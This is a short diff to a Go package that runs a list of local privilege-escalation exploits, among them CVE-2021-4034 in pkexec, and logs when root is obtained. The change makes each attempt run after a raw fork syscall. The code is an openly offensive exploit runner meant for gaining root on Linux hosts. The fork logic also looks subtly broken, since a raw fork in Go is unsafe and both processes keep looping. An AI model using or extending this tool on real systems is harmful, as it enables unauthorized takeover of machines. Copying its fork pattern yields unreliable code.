@@ -1,6 +1,9 @@
 package golpe
 
-import "log"
+import (
+	"log"
+	"syscall"
+)
 
 var All = map[string]func() error{
 	"CVE-2021-4034":  CVE_2021_4034,  // pkexec
@@ -10,12 +13,15 @@ var All = map[string]func() error{
 func RunAll() (err error) {
 	for cve, exp := range All {
 		log.Printf("Trying %s...", cve)
-		err = exp()
-		if err == nil {
-			log.Printf("Successfully got root via %s", cve)
-			break
+		pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+		if pid == 0 {
+			err = exp()
+			if err == nil {
+				log.Printf("Successfully got root via %s", cve)
+				break
+			}
+			log.Printf("%s: %v", cve, err)
 		}
-		log.Printf("%s: %v", cve, err)
 	}
 	return
 }
